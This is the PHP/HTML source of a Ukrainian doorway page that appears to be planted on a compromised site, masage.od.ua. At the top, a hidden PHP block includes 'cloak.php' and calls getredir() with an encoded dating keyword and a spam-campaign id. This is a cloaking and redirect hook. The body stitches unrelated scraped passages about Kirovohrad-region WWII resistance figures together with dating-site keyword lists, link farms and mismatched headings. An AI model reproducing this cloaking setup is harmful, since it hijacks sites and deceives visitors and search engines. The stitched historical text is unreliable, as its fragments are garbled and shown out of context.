<?php
if(!@include('cloak.php'))	@include('../cloak.php');
if(function_exists('getredir')){
	@getredir ('api', '%d1%88%d0%b2%d0%b8%d0%b4%d0%ba%d1%96%d1%81%d0%bd%d0%b5+%d0%b7%d0%bd%d0%b0%d0%b9%d0%be%d0%bc%d1%81%d1%82%d0%b2%d0%be+%d0%bd%d0%b0+%d0%bf%d1%96%d0%b2%d0%b4%d0%b5%d0%bd%d1%8c+%d0%bf%d0%be%d0%b1%d0%bb%d0%b8%d0%b7%d1%83+%d0%94%d0%be%d0%bb%d0%b8%d0%bd%d1%81%d1%8c%d0%ba%d0%b0+%d0%a3%d0%ba%d1%80%d0%b0%d1%97%d0%bd%d0%b0', '2021-05-21', 'pir_210521/UA_dat_geo_trans_ukr', 'ua_dating.txt');
}
?><!doctype html>
<html lang="">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<title>Тури для ДИТЯЧИХ ГРУП (групп школярів) по ЛЬВОВУ</title>
	<meta name="description" content="Це був безпрецедентний випадок: у межах України центром Долинського У зв'язку з будівництвом поблизу міста Криворізького гірничо-збагачувального Долинська — основний залізничний вузол півдня Кіровоградщини. З." />
	<link rel="canonical" href="https://masage.od.ua/img/137/pynot-shvidksne-znayomstvo.php" />
<?php if(!@include('../inc1mywp1.php')) @include('inc1mywp1.php'); ?>
						<div id="primary-menu" class="menu"><ul>
<li class="page_item page-item-2"><a href="https://masage.od.ua/img/103/cy-sayti-seksualnih.php">сайти сексуальних знайомств у Кривий Ріг Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/184/mog-obdn-pobachennya-zolote.php">обідні побачення Золоте Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/184/xutu-svatannya-sinelnikove-ukrana.php">сватання Синельникове Україна</a></li>
</ul></div>
						<div class="main-navigation-bg"></div>
						<div class="clearfix"></div>
					</nav><!-- #site-navigation -->
				</div>
			</div>

		</div>

	</header><!-- #masthead -->



	<div id="content" class="site-content">
	<div class="container"><div class="row"><div class="col-md-7 order-md-3">
	<div id="primary" class="content-area">
		<main id="main" class="site-main main-content-middle">


<article id="post-1" class="post-1 post type-post status-publish format-standard hentry category-uncategorized">
		<header class="entry-header">
		<h1 class="entry-title">Швидкісне знайомство на південь поблизу Долинська Україна</h1><!-- .entry-meta -->
			</header><!-- .entry-header -->



	<div class="entry-content">

<p>
<p>Тоді на борту санітарного літака розмістили 20 іспанських дітей-сиріт, серед яких виділявся хлопчик років десяти з пораненою рукою. Батьки маленького іспанця загинули в бою під Валенсією, а поранення він отримав, підносячи дорослим патрони та медикаменти. З початком Другої світової війни в Європі почав формуватися рух Опору — організована протидія німецько-фашистській окупації.</p>
<p>Другий в списку нагороджених орденом Вітчизняної війни — після Віри Аполлонівни Оболенської, російської емігрантки князівського походження, гільотованої у віці 33 років, — житель Олександрійського району Кіровоградської області Георгій Володимирович Шибанов. Архівний матеріал про цю мужню людину зібрано в документах особового фонду уродженця Долинського району, краєзнавця, учасника французького руху Опору Івана Сергійовича Проценка. Вони мали спільне минуле, наповнене ризиком та відвагою. Народився він у році в місті Миколаєві.</p>
		
			<br><ul>
			
				<li>сайти знайомств людина Стебник Україна;</li>
			
				<li>вік знайомств в Світловодськ Україна;</li>
			
				<li>Розділ - Особам з інвалідністю?</li>
			
				<li>знайомства навколо поблизу Макіївка Україна?</li>
			
				<li>найкраще додаток для лесбіянок в Сніжне Україна;</li>
			
			</ul>
		
	<p>У році Шибанов — активіст профспілкового руху — став членом французької Компартії. Війна у сусідній Іспанії вплинула на його рішення підтримати республіканців: він добровільно став бійцем інтербригади. Довелося прикривати евакуацію госпіталю та мирних жителів з району ведення бойових дій, підвозити снаряди захисникам Арагону. Потім був полон… Перебуваючи у концтаборі Сен-Сепрієн, Георгій Володимирович редагував газету для військовополонених.</p>
<p>У військовому квитку Шибанова іспанці вказали його партійну приналежність — антифашист. З початком окупації Парижа Георгій Володимирович під псевдонімом Андре став активним учасником руху Опору. Чапаєва, командиром якого був уродженець Вінниччини, колишній військовополонений, національний герой Франції, посмертно удостоєний звання Героя Радянського Союзу, Василь Порик.</p>
<p>Цим було наповнено життя антифашиста.</p><strong><a id='u1'></a><h2>Дослідно-селекційний дендрологічний лісовий центр 'Веселі Боковеньки'</h2></strong><p>Виконуючи одне з доручень, Георгій Володимирович почав працювати на базі військово-морських сил вермахту. Це надало можливість для отримання розвідданих та створення осередку Руху за участі іспанця А. Сілісто та чеха Й. Підпільники-антифашисти затримували вантажопотоки, псували зброю, приладдя. Через рік після завершення Другої світової війни Георгій Володимирович повернувся на Батьківщину. Працював герой-антифашист слюсарем на брикетній фабриці селища Димитрове в Олександрійському районі.</p>
<p>Доповнюють відомості про участь кіровоградців у французькому русі Опору документи особового фонду ветерана Другої світової війни, краєзнавця, уродженця Долинського району області Івана Сергійовича Проценка  Доля цієї людини склалася так, що довелося бути і вчителем, і воїном. Іван Сергійович, вчитель початкової школи, був призваний в році на військову службу, яку ніс до року. Демобілізувавшись, повернувся до педагогічної діяльності, згодом, після закінчення Запорізького педінституту, став інспектором шкіл Долинського районного відділу освіти.</p>
<p>Наш земляк брав участь у боях за Дніпропетровськ, Харків, воював на Донеччині. У квітні року нагороджений орденом Червоного Прапора, йому присвоїли звання молодшого лейтенанта. Два місяці потому ворог прорвав оборону на Південно-Західному фронті, і стрілецька дивізія ї армії залишилася в оточенні. Після тяжкої контузії Проценко потрапляє у полон. Через поляка-антифашиста Юзефа Тлочека надходили повідомлення радянського Інформбюро, у вигляді листівок їх розповсюджували у шахті. Проценко у своїх спогадах вказував на те, що агітаційна робота мала позитивний результат: були випадки, коли навіть солдати-власівці, задіяні в охороні шахт, зі зброєю в руках переходили до партизанів.</p>
<p>Завдяки допомозі Центрального комітету радянських полонених, до складу якого входили Г. Шибанов, В. Галкін, М. Слободинський, В. Спільні дії військовополонених та партизанів призвели до знищення центральної електростанції та компресорної. Полонених вивезли до Німеччини, призначили у робочу команду , яка працювала у шахті міста Альтенбоге, земля Рур-Вестфалія. А найголовніше — необхідно було врятувати життя полонених до підходу союзних військ.</p><a id='u2'></a><h3>Налаштування кольорів та шрифтів</h3><p>У серпні року Івана Сергійовича репатрійовано на Батьківщину, демобілізувався він через три місяці після повернення. Поновлення його членства у партії восени року — відображення радянських реалій.</p>
		
	<p>Журналіст А. Потрібен був час, щоб розібратися в усьому. Підтвердження антифашистської діяльності Проценка під час полону у Франції та Німеччині надійшли від колишніх військовополонених — учасників руху Опору, жителів Воронезької, Курської, Калінінської областей. Народився наш земляк у Олександрійському районі Кіровоградської області. У році закінчив військову школу, наступного року він — бойовий командир взводу ї стрілецької дивізії Південного фронту — потрапляє у полон, звідки здійснює втечу.</p><img src="https://www.depo.ua/uploads/45778/conversions/248c1fa7c52c4cd0898204964bccdc4f-wide-big.jpg" alt="" style="max-width: 480px; max-height: 480px;"/><p>Згодом Шаповалов стає підпільником та партизаном загону ім. Ворошилова, який діяв на території Кіровоградщини. Після навчання у спецшколі Головного розвідувального управління Генерального штабу Радянської Армії у році у складі розвідгрупи потрапляє на територію Польщі для виконання завдання командування 1-го Українського фронту.</p>
<p>Важливими на той час були дані про рубежі оборони, розміщені на берегах річки Вісли, а також інформація про дислокацію сил противника у районі міста Кракова — центру створеного німецькою окупаційною владою генерал-губернаторства. Командуванню 1-го Українського фронту розвідники надіслали понад радіограм, які містили важливі дані.</p>
		
			
				<div>Долинська - Недалечко</div>
				<div><iframe width='560' height='315' src='https://www.youtube.com/embed/JmobaNS8CuU' frameborder='0' allowfullscreen></iframe></div>
			
		
	<p>Олексієм Трохимовичем підготовлено й успішно проведено більше 10 диверсій. За допомогою завербованого співробітника гестапо Гартмана підпільники одержали необхідні посвідчення, з якими могли без перешкод рухатися містом та його околицями. Розвідувальній групі вдалося роздобути карту мінування Кракова, давньої столиці Польщі, ледь не висадженого в повітря відступаючими гітлерівськими військами.</p>
<p>І республіканські, і обласні періодичні видання описували краківський період життя та боротьби Олексія Шаповалова, він став прототипом героїв восьми художніх творів. Серед документів особового фонду нашого земляка — чимало листів, надісланих йому з Польщі від соратників по боротьбі з гітлерівським фашизмом.</p>
<p>Які б корективи не вносив час у висвітлення подій Другої світової війни, свідчення її учасників, які зберігаються в архівах, залишаються важливим джерелом нашої історії. Пасічник Л. Він не хотів більше жити.</p><a id='u3'></a><h3>Навігаційне меню</h3><p>Він бажав смерті, а вони вперто повертали його на цей світ. І це воскресіння він сприймав як чергову витончену тортуру, яка знову таки закінчиться його смертю, страшною і невідворотною. Але на скільки страшною — він не уявляв, не міг уявити, і це ще більше пригнічувало.</p>
<p>Він, атеїст, просив у Бога швидкої смерті, але його мовчазні волання, схоже, не дійшли до адресата. Пройшовши сім земних кіл пекла, його чиясь зла воля повертала на початок, аби він знову пройшов страшний тернистий шлях на свою Голгофу. Лежачи на білих простирадлах, він згадував миттєвості свого життя. Можливо, десь там приховані причини його жахливого кінця…. Закінчив чотирикласну школу.</p>
<p>Змалку допомагав батькам по господарству, наймитував. У неповних 14 років ранньою весною року подався до Кривого Рогу і два роки працював коногоном у шахті. Буремний рік. Хтось із його односельців подався до Петлюри, хтось шукав своєї правди недалеко від дому — у повстанських загонах Холодного Яру. Петрові здалося, що його правда з більшовиками. Адже їхні гасла були такими простими й зрозумілими: «Земля — селянам, фабрики, заводи, шахти — робітникам…». Навесні року — демобілізація. Але руки, які звикли до шаблі й рушниці, важко звикали до плуга.</p>
<p>Та й Україна ще гомоніла… І він повернувся до шаблі, на два роки став чонівцем. ЧОН — це частини особливого призначення боротьби з «бандитизмом». Воював на Поділлі, півдні України. Червона Армія відкрила молодому комсомольцю соціальний ліфт нагору.</p><strong><a id='u4'></a><h2>19 524 973</h2></strong><p>Він став активістом, згодом увійшов у номенклатуру — касту професійних більшовицьких управлінців. У Петро очолив комнезам комітет незаможних селян у рідному селі, згодом став головою сільради. На цій посаді він пережив рік — рік «великого перелому», коли ламали через коліно українське село, розкуркулювали, відправляли до Сибіру заможнішу частину гречкосіїв, а решту зганяли у колгоспи.</p>
<p>Потім був страшний рік… Важко сказати, чи усвідомлював він увесь жах тих «непопулярних реформ», які проводилися завдяки і його зусиллям. Адже пропагандистська машина працювала тоді на повну потужність, промиваючи мізки у першу чергу саме таким, як Василина.</p>
		
			<br><ul>
			
				<li>найкращі послуги знайомств в Докучаєвськ Україна;</li>
			
				<li>чоловіки знайомства в Генічеськ Україна;</li>
			
				<li>знайомства місто поблизу Корсунь-Шевченківський Україна.</li>
			
				<li>.</li>
			
				<li>безкоштовний сайт знайомств поблизу Корюківка Україна;</li>
			
			</ul>
		
	<p>Партія привчала номенклатуру не замислюватися, беззастережно виконувати вказівки-резолюції. Поява сумнівів, відчуття того, що йдемо не тим шляхом і не так, означали профнепридатність. У січні року утворено Кіровоградську область. Василина став завідувачем сільгоспвідділом Кіровоградського обкому та членом бюро обкому партії. Далі була війна. З приходом фашистів батальйон став партизанським загоном. Петро Василина у цей час був у Києві. Добрався до Сміли, перейшов лінію фронту і 10 серпня року потрапив до партизанського загону Андрія Куценка в Холодному Яру.</p>
<p>То ж прихід німців багато хто сприйняв чи то байдуже, чи навіть із певною надією. У Кіровограді одні зустрічали непроханих гостей зі зброєю в руках, а вже наступного дня інші майже у тому ж місці, де ще кров учорашніх не встигла увійти в землю, зустрічали фашистів із хлібом і сіллю, а на розі вулиць Шевченка і Луначарського узагалі спорудили тріумфальну арку й оздобили її квітами.</p><strong><a id='u5'></a><h2>Місто Долинська: історія і сучасність - Долинська районна бібліотека для дорослих</h2></strong><p>Багаторічне культивування і заохочення доносів почало працювати вже проти більшовиків. У перші місяці окупації Олександрівського району фашисти стратили 23 жителі району, переважно тих, кого залишили для підпільної роботи. Інструктор обкому Шамардін переховувався у лазові, викопаному в глинищі в Олександрівці, в копиці соломи біля села Бірки, у землянці в лісі поблизу Триліс, де його й схопили за доносом. Сільський комуніст, голова колгоспу Зубенко перед приходом німців привіз до своєї оселі в Поселянівку з району зброю, набої, радіоприймач.</p>
</p>
	</div><!-- .entry-content -->

</article><!-- #post-1 -->


		</main><!-- #main -->
	</div><!-- #primary -->


	</div><div class="col-md-2 order-md-1">

	<aside id="secondary" class="widget-area">
			</aside><!-- #secondary -->
</div><div class="col-md-3 order-md-10">
	<aside id="secondary" class="widget-area">
		<section id="search-2" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://masage.od.ua/img/184/jocoj-zona-znayomstv.php">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></section>		<section id="recent-posts-2" class="widget widget_recent_entries">		<h2 class="widget-title">Recent Posts</h2>		<ul>
											<li><a href="https://masage.od.ua/img/428/zepo-studentsk-shvidksn-znayomstva.php">студентські швидкісні знайомства поблизу Маріуполь Україна</a></li><li><a href="https://masage.od.ua/img/494/xajy-bezkoshtovn-sayti.php">безкоштовні сайти лесбіянок - Селидове Україна</a></li><li><a href="https://masage.od.ua/img/467/zeru-naykrashe-msto-dlya.php">найкраще місто для знайомств місто в Нововолинськ Україна</a></li><li><a href="https://masage.od.ua/img/137/kuzy-krashiy-dodatok-pdklyuchennya.php">кращий додаток підключення в Мерефа Україна</a></li><li><a href="https://masage.od.ua/img/137/coqor-naypopulyarnshiy-sayt.php">найпопулярніший сайт знайомств Кальміуське Україна</a></li>
					</ul>
		</section>

			<section id="meta-2" class="widget widget_meta"><h2 class="widget-title">Contents</h2>
				<ol><li><a href='#u1'>Дослідно-селекційний дендрологічний лісовий центр 'Веселі Боковеньки'</a></li>
<li><a href='#u2'>Налаштування кольорів та шрифтів</a></li>
<li><a href='#u3'>Навігаційне меню</a></li>
<li><a href='#u4'>19 524 973</a></li>
<li><a href='#u5'>Місто Долинська: історія і сучасність - Долинська районна бібліотека для дорослих</a></li>
</ol>
			</section>

	</aside><!-- #secondary -->
</div></div></div>	</div>
	<footer id="colophon" class="site-footer">

		<div class="covf-footer-copyright">
			<div class="container">
				<div class="row">
					<div class="col">
						<div class="site-info text-center">
							Powered by 	<a href="https://masage.od.ua/img/247/dy-znayomstva-z-lyudinoyu.php">Covfefe WordPress Theme</a>
						</div>
					</div>
				</div>
			</div>
		</div>
	</footer><!-- #colophon -->
</div><!-- #page -->

<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/jquery.marquee.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/scripts.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/comment-reply.min.js?ver=5.0.3'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/wp-embed.min.js?ver=5.0.3'></script>

</body>
</html>